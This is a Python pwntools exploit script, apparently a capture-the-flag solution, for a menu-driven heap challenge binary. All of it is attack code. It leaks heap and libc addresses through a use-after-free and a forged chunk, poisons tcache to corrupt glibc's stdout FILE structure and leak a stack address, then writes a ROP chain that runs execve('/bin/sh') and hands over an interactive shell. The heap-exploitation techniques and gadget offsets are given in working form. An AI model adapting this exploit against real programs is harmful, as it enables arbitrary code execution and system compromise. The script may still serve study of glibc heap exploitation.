# heap fd leak
from pwn import *

context.log_level = "debug"

p = process("ll")

def add_num(id, size, data):
    p.sendlineafter(b"Your choice: ", b"1")
    p.sendlineafter(b"ID: ", str(id).encode())
    p.sendlineafter(b"How many numbers do you want to input? ", str(size).encode())

    for idx in range(size):
        p.sendline(str(data[idx]).encode())

def del_num(id):
    p.sendlineafter(b"Your choice: ", b"2")
    p.sendlineafter(b"ID: ", str(id).encode())

def view_num(id):
    p.sendlineafter(b"Your choice: ", b"3")
    p.sendlineafter(b"ID: ", str(id).encode())

def edit_num(id, datas):
    p.sendlineafter(b"Your choice: ", b"4")
    p.sendlineafter(b"ID: ", str(id).encode())

    for data in datas:
        p.sendline(str(data).encode())

def add_name(index, size, name):
    p.sendlineafter(b"Your choice: ", b"5")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size - 0x10).encode())
    p.send(name)

def del_name(index):
    p.sendlineafter(b"Your choice: ", b"6")
    p.sendlineafter(b"Index: ", str(index).encode())

# leak fd heap
add_num(1, 3, [0, 0x621, 0]) # fake chunk size : 0x621
add_num(2, 2, [1,1])
add_num(3, 2, [1,1])

del_num(2)

add_num(2, 2, [1, 1])
del_num(3)

view_num(3)

p.recvuntil(b"is: ")
heap_base = int(p.recvline()[:-1], 16) << 12

print("[+] heap base address: 0x%016x" % (heap_base))

"""
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555594d0, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
    [0x00005555555594d0     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559700, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559700     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559930, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559930     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559b60, size=0x204b0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
"""
first_num_chunk_offset = 0x4d0
first_num_chunk_address = heap_base + first_num_chunk_offset

print("[+] num_chunk[0] address: first_num_arr_address: 0x%016x" % (first_num_chunk_address))

# generate fake chunk
fake_chunk = b"\x00" * 0x1b0
fake_chunk += p64(0x0)
fake_chunk += p64(0x61)
fake_chunk += p64(0x0) * 0x6 
fake_chunk += p32(3)# id 
fake_chunk += p32(2)# size
fake_chunk += p64(first_num_chunk_address + 0x10) # next

print(len(fake_chunk))

add_name(0, 0x220, fake_chunk)
# [head] -> [1] -> [2] -> [3] -> [0](fake_chunk) -> [NULL]
# [0]->next = *([1] + 0x10)

del_num(0)
# [head] -> [1] -> [2] -> [3] -> [NULL]
# free([0]) 

view_num(1)
# get unsorted bin address
p.recvuntil(b"Number at index 2 is: ")

#leak libc base address
libc_base = int(p.recvline()[:-0x1], 0x10) - 0x203b20 # offset
print("[+] lib_base address: 0x%016x" % (libc_base))

# generate system("/bin/sh")
libc = ELF("libc.so.6")
binsh = libc_base + next(libc.search(b'/bin/sh'))
print("[+] \"/bin/sh\" address: 0x%016x" % (binsh))

# using FSOP(File Stream Oriented Programming) can rbp address leak
io_2_1_stdout = libc_base + libc.sym['_IO_2_1_stdout_']
environ = libc_base + libc.sym['environ']
print("_IO_2_1_stdout adress: 0x%016x" % (io_2_1_stdout))
print("environ adress: 0x%016x" % (environ))

add_name(1, 0x60, b"dummy")
add_name(2, 0x60, b"dummy")

del_name(2)
del_name(1)

edit_num(1, [0, 0x60, ((first_num_chunk_address + 0x10) >> 0xc) ^ (io_2_1_stdout - 0x10)])
add_name(1, 0x60, b"dummy")

io_file_strcut_bin_data = p64(0xfbad1800) # _flags
io_file_strcut_bin_data += p64(0x0) # _IO_read_ptr
io_file_strcut_bin_data += p64(0x0) # _IO_read_end
io_file_strcut_bin_data += p64(0x0) # _IO_read_base
io_file_strcut_bin_data += p64(environ) # _IO_write_base
io_file_strcut_bin_data += p64(environ + 8) # _IO_write_ptr
io_file_strcut_bin_data += p64(environ) # _IO_write_end
io_file_strcut_bin_data += p64(environ) # _IO_buf_base
io_file_strcut_bin_data += p64(environ) # _IO_buf_end

add_name(2, 0x60, io_file_strcut_bin_data)

# rbp register value leak 
rbp_register_offset = 0x138
rbp_register_value = u64(p.recv(8)) - rbp_register_offset

print("[+] rbp_register_value: 0x%016x" % (rbp_register_value))

# ROP
add_num(4, 1, [1])
del_num(4)
del_name(0)

# prepare overwrite rbp
edit_num(3, [((heap_base + 0x930) >> 12 ) ^ rbp_register_value, 1])
add_name(0, 0x228, b"dummy")

pop_rsi_ret_gadget_address = libc_base + 0x110a4d
pop_rdi_ret_gadget_address = libc_base + 0x10f75b
pop_rax_ret_gadget_address = libc_base + 0xdd237
syscall_gadget_address = libc_base + 0x288b5

rop_payload = []
rop_payload.append(0x0)
rop_payload.append(pop_rdi_ret_gadget_address)
rop_payload.append(binsh)
rop_payload.append(pop_rax_ret_gadget_address)
rop_payload.append(0x3b)
rop_payload.append(syscall_gadget_address) # sys_execve("/bin/sh", 0);

add_num(0, len(rop_payload), rop_payload)

# trigger !!!
p.sendlineafter(b"Your choice: ", b"7")

p.interactive()